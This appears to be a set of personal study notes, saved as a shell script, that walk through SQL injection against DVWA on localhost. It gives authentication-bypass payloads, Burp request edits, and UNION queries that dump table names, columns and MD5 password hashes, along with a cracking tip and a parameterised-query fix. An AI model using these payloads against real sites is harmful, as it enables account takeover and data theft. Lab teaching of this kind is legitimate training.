#!/bin/bash

# SQL INJECTION
  OSWAP A03:2021 - INJECTION 
  Occurs when user-supplied input is inserted directly into a SQL query without sanitisation
  The attacker can manipulate the query logic to bypass authentication, extract data, modify data, or execute OS commands - depending on the database and configuration
# Why It Happens — The Root Cause
  A developer writes a login query like this:
  "Vulnerable PHP Code"
   $query = "SELECT * FROM users WHERE
   username = '$username' AND
   password = '$password'";
   # User input injected DIRECTLY into the query
   # The database cannot tell data from code
" When you submit username = admin' -- -, the query becomes: "
   SELECT * FROM users WHERE
   username = 'admin'-- -' AND
   password = 'anything'
   # -- - comments out everything after it
   # Password check is completely skipped
   # Result: Login succeeds without knowing the password
# Impact Levels of SQLi
1. Authentication bypass: Login as any user without credentials
2. Data extraction:       Dump entire database - usernames, passwords, email, credit cards
3. Data modification:     UPDATE or DELETE records in the database
4. File read/write:       Read server files (MySQL: LOAD_FILE), write webshells
5. OS command execution:  MySQL: xp_cmdshell (MSSQL), UDF (MySQL with config)
# Detection Signs
1. Adding a single quote ['] causes a database error
2. Page behaves differently for [1=1] vs [1=2] conditions
3. Page takes significantly longer to load for [SLEEP(5)] payloads

# STEP1 - Finding the injection point
  # Navigate to: http://localhost/vulnerabilities/sqli/
  # You see an input field: "User ID:" with a Submit button

  # TEST 1: Normal input - baseline behaviour
  # Input: 1 -> Submit
  ID: 1 First name: admin Surname: admin
  # URL becomes: ?id=1&Submit=Submit -> GET parameter 'id'

  # TEST 2: Injection test - add a single quote
  # Input: 1' -> Submit
  You have an error in your SQL syntax; check the manual...
  ↑ DATABASE ERROR! This confirms SQL injection is possible.
  The single quote broke out of the string - it's injecting into the SQL query.
  The error message also reveals: database type, table structure, query format.

  # TEST 3: Boolean test - does logic injection work?
  # Input: 1' AND '1'='1 -> Submit
  ID: 1 First name: admin Surname: admin
  # Input: 1' AND '1'='2 -> Submit
  (no results)
  ↑ Different results for TRUE vs FALSE = confirmed Boolean SQLi
  The application is responding to the logic inside your quote.

# STEP2 - Authentication Bypass (Logic SQLi)
  # The backend query for login is typically:
  # SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

  # PAYLOAD 1: Comment out the password check
  # Username field: admin'-- -
  # Password field: anything
  # Query becomes:
  SELECT * FROM users WHERE username='admin'-- -' AND password='anything'
  The -- - comments out ' AND password='anything' entirely
  Result: Logged in as admin without knowing the password

  # PAYLOAD 2: OR injection - bypass when username unknown
  # Username: ' OR '1'='1'-- -
  SELECT * FROM users WHERE username='' OR '1'='1'-- -' AND password='...'
  '1'='1' is always TRUE -> returns the FIRST user in the database
  Often returns the admin (first user created)

  # PAYLOAD 3: Specific user bypass
  # Username: ' OR username='admin'-- -
  Bypasses and targets specific username even without password

  # In Burp Suite: intercept the login POST, modify in Repeater tab
  # Original: username=admin&password=wrongpassword&Login=Login
  # Modified: username=admin'-- -&password=anything&Login=Login
  Send -> observe response -> success = "Welcome to the password protected area"

# STEP3 - UNION Atack - Extracting Data from the Database
  The UNION operator combines the results of two SELECT queries
  A SQLi UNION attack adds a second SELECT that reads from any table in the database
  This is how you extract usernames and passwords from the database

  The rules:
  1. Both queries must return the same number of columns.
  2. The data types in corresponding columns must be compatible

  # PHASE 1: Find number of columns using ORDER BY
  # Increment ORDER BY until you get an error
  # Input: 1' ORDER BY 1-- -
  ID: 1 First name: admin (works - at least 1 column)
  # Input: 1' ORDER BY 2-- -
  ID: 1 First name: admin (works - at least 2 columns)
  # Input: 1' ORDER BY 3-- -
  Unknown column '3' in 'order clause'
  ↑ Error at ORDER BY 3 -> the query returns exactly 2 columns

  # PHASE 2: Find which columns are displayed using NULL placeholders
  # Input: ' UNION SELECT NULL,NULL-- -
  ID: First name: Surname: (blank row appeared!)
  A blank row appeared from our UNION SELECT - both columns display output

  # PHASE 3: Extract database metadata
  # Input: ' UNION SELECT database(),user()-- -
  ID: First name: dvwa Surname: root@localhost
  database() = dvwa (current database name)
  user() = root@localhost (DB user running the query - root [DANGEROUS])

  # PHASE 4: Extract table names from information_schema
  # Input: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
  ID: First name: guestbook Surname:
  ID: First name: users Surname:
  Tables found: guestbook, users - we want the 'users' table

  # PHASE 5: Extract column names from the users table
  # Input: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
  First name: user_id | First name: first_name
  First name: last_name | First name: user
  First name: password | First name: avatar
  Columns found: user_id, first_name, last_name, user, password, avatar

  # PHASE 6: Extract usernames and password hashes
  # Input: ' UNION SELECT user,password FROM users-- -
  ID: First name: admin Surname: 5f4dcc3b5aa765d61d8327deb882cf99
  ID: First name: gordonb Surname: e99a18c428cb38d5f260853678922e03
  ID: First name: 1337 Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
  These are MD5 hashes. 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
  Verify: echo -n "password" | md5sum -> 5f4dcc3b5aa765d61d8327deb882cf99
  Or: search on crackstation.net (online hash database)

# Secure Code - How SQLi is fixed
  The fix is parameterised queries (prepared statements)
  The database receives the query structure and data separately - user input can never become SQL code

  # VULNERABLE (Python/SQLite):
  cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
  # SECURE - parameterised query:
  cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
  # The ? is a placeholder. The database treats user_id as DATA only.
  # No amount of SQLi payload makes it execute as SQL code.
